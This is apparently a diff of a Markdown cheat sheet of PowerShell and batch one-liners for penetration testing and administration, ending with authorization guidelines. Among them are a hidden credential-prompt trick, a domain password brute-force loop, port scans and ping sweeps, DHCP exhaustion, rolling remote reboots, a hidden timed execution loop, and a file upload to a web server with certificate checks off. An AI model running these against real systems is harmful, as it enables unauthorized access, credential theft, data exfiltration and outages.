@@ -1,6 +1,7 @@
 # PowerShell and Batch Script Reference
 
 ## Table of Contents
+
 1. [PowerShell Basics](#powershell-basics)
 2. [PowerShell One-Liners](#powershell-one-liners)
 3. [Batch Scripts](#batch-scripts)
@@ -109,18 +110,21 @@ Get-ChildItem | Measure-Object -Property Length -Sum
 ### Network Operations
 
 #### Port Scanner
+
 ```powershell
 # Scan multiple ports on a single host
 $ports=(80,443,3389,22,21,25);$ip="<IP_ADDRESS>";foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{};if ($socket -eq $NULL){echo $ip":"$port" - Closed";}else{echo $ip":"$port" - Open";$socket = $NULL;}}
 ```
 
 #### Ping Host
+
 ```powershell
 # Ping with timeout
 $ping = New-Object System.Net.Networkinformation.ping;$ping.Send("<IP_ADDRESS>",500)
 ```
 
 #### Get Active TCP Connections
+
 ```powershell
 # PowerShell network connections (equivalent to netstat)
 [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections()
@@ -129,6 +133,7 @@ $ping = New-Object System.Net.Networkinformation.ping;$ping.Send("<IP_ADDRESS>",
 ### Credential and Authentication
 
 #### Prompt for Credentials
+
 ```powershell
 # Hidden window credential prompt
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass
@@ -136,6 +141,7 @@ $Host.UI.PromptForCredential("<WINDOW_TITLE>","<MESSAGE>","<USERNAME>","<DOMAIN>
 ```
 
 #### Execute with Credentials
+
 ```powershell
 # Create credential object and execute
 $password = ConvertTo-SecureString -String "<PASSWORD>" -AsPlainText -Force;
@@ -146,6 +152,7 @@ Start-Process powershell -Credential $cred -ArgumentList '-noprofile -command &{
 ### Scheduled Execution
 
 #### Time-Based Execution
+
 ```powershell
 # Run file every 4 hours between specific dates
 powershell -Command "do {if ((Get-Date -format YYYYMMDD-HHMM) -match '202208(0[8-9]|1[0-1])(0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden '<FILE_PATH>';Start-Sleep -s 14400}}while(1)"
@@ -154,6 +161,7 @@ powershell -Command "do {if ((Get-Date -format YYYYMMDD-HHMM) -match '202208(0[8
 ### Email Operations
 
 #### Send Email with Attachment
+
 ```powershell
 # Send email with SMTP
 Send-MailMessage -to "<EMAIL>" -from "<EMAIL>" -subject "<SUBJECT>" -Attachments "<FILE_PATH>" -Body "<BODY>" -SmtpServer "<IP_ADDRESS>" -Port "<PORT>" -Credential "<PS_CRED_OBJECT>" -UseSsl
@@ -162,6 +170,7 @@ Send-MailMessage -to "<EMAIL>" -from "<EMAIL>" -subject "<SUBJECT>" -Attachments
 ### File Operations
 
 #### Download File from Web
+
 ```powershell
 # Download file via HTTP/HTTPS
 powershell -noprofile -noninteractive -Command 'Invoke-WebRequest -Uri "https://<URL>" -OutFile <FILE_PATH>'
@@ -171,12 +180,14 @@ powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://<UR
 ```
 
 #### Upload File via HTTP POST
+
 ```powershell
 # Upload file to web server via POST (server must be listening)
 powershell -noprofile -noninteractive -command '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="http://<URL>"; $filepath="<FILE_PATH>"; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);'
 ```
 
 #### Search for Files
+
 ```powershell
 # Recursively find log files modified after specific date
 Get-ChildItem -Path <FILE_PATH> -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt "2012-08-20"}
@@ -188,6 +199,7 @@ Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.doc,*.docx -ErrorAction Silent
 ### Data Export
 
 #### Export to CSV
+
 ```powershell
 # Export OS information to CSV
 Get-WmiObject -Class win32_operatingsystem | Select-Object -Property * | Export-Csv <FILE_PATH>
@@ -199,6 +211,7 @@ Get-Service | Where-Object {$_.Status -eq "Running"} | Export-Csv running-servic
 ### Network Shares
 
 #### Map Network Drive Persistently
+
 ```powershell
 # Create persistent network drive mapping
 New-PSDrive -Persist -PSProvider FileSystem -Root \\<IP_ADDRESS>\<SHARE_FOLDER> -Name I
@@ -211,6 +224,7 @@ New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\<IP_ADDRESS>\<SHARE>" -Cre
 ### Remote Management
 
 #### Enable PowerShell Remoting
+
 ```powershell
 # Turn on PowerShell remoting (requires admin)
 Enable-PSRemoting -Force
@@ -228,16 +242,19 @@ Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
 ### Network Scanning
 
 #### Nested For Loop Ping Sweep
+
 ```batch
 for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100 10.10.%i.%x 2>nul | find "Reply" && echo 10.10.%i.%x >> live.txt)
 ```
 
 **Batch file version**:
+
 ```batch
 for /L %%i in (10,1,254) do @ (for /L %%x in (10,1,254) do @ ping -n 1 -w 100 10.10.%%i.%%x 2>nul | find "Reply" && echo 10.10.%%i.%%x >> live.txt)
 ```
 
 #### DNS Reverse Lookup
+
 ```batch
 for /L %P in (2,1,254) do (nslookup 10.1.11.%P | findstr /i /c:"Name" >> dns.txt && echo HOST: 10.1.11.%P >> dns.txt)
 ```
@@ -245,22 +262,26 @@ for /L %P in (2,1,254) do (nslookup 10.1.11.%P | findstr /i /c:"Name" >> dns.txt
 ### File Processing
 
 #### Loop Through File Lines
+
 ```batch
 for /F "tokens=*" %A in (<FILE_PATH>) do echo %A
 ```
 
 **Batch file version**:
+
 ```batch
 for /F "tokens=*" %%A in (<FILE_PATH>) do echo %%A
 ```
 
 #### Search for Files
+
 ```batch
 # Search for files beginning with "pass" and display details
 forfiles /P <FILE_PATH> /s /m pass* -c "cmd /c echo @isdir @fdate @ftime @relpath @path @fsize"
 ```
 
 **Variables**:
+
 - `@isdir` - Is directory
 - `@fdate` - File date
 - `@ftime` - File time
@@ -271,12 +292,14 @@ forfiles /P <FILE_PATH> /s /m pass* -c "cmd /c echo @isdir @fdate @ftime @relpat
 ### Authentication Testing
 
 #### Domain Brute Force
+
 ```batch
 # Test user/password combinations against domain
 for /F %%N in (users.txt) do for /F %%P in (passwords.txt) do net use \\<IP_ADDRESS>\IPC$ /user:<DOMAIN>\%%N %%P 1>NUL 2>&1 && echo %%N:%%P && net use /delete \\<IP_ADDRESS>\IPC$ > NUL
 ```
 
 #### Account Lockout Test
+
 ```batch
 # lockout.bat - Test account lockout policy
 @echo Test run:
@@ -286,12 +309,14 @@ for /F "tokens=*" %%A in (<FILE_PATH>) do net use \\<IP_ADDRESS>\c$ /USER:<DOMAI
 ### Network Operations
 
 #### DHCP Exhaustion
+
 ```batch
 # Rapidly request DHCP addresses (network stress test)
 for /L %P in (2,1,254) do (netsh interface ip set address name="<INTERFACE_NAME>" static 10.0.42.%P 255.255.255.0 <GATEWAY_IP> && ping 127.0.0.1 -n 1 -w 10000 > nul %1)
 ```
 
 #### DNS Lookup Simulation
+
 ```batch
 # Simulate DNS lookups for malicious domains (useful for AV/IDS testing)
 # domains.txt should contain known malicious domains
@@ -301,12 +326,14 @@ for /F "tokens=*" %%A in (C:\Users\Administrator\Desktop\domains.txt) do nslooku
 ### System Operations
 
 #### Simulated Web Browsing
+
 ```batch
 # Generate web traffic for testing (browse to URLs 400 times)
 for /L %P in (2,1,401) do @for %%U in (<URL1> <URL2> <URL3>) do start /b iexplore %%U & ping -n 6 localhost & taskkill /F /IM iexplore.exe
 ```
 
 #### Rolling Reboot/Shutdown
+
 ```batch
 # Rolling reboot across IP range
 for /L %P in (2,1,254) do shutdown /r /m \\1.1.1.%P /f /t 0 /c "Reboot message"
@@ -525,6 +552,7 @@ netstat -ano | Select-String "LISTENING" | ForEach-Object {$_.ToString().Trim() 
 ### Safe Usage Guidelines
 
 **DO**:
+
 - Test scripts in isolated lab environments first
 - Document all script executions
 - Obtain written authorization before testing
@@ -533,6 +561,7 @@ netstat -ano | Select-String "LISTENING" | ForEach-Object {$_.ToString().Trim() 
 - Implement proper error handling
 
 **DON'T**:
+
 - Run destructive scripts in production without approval
 - Test authentication scripts against live systems
 - Execute network scanning without authorization
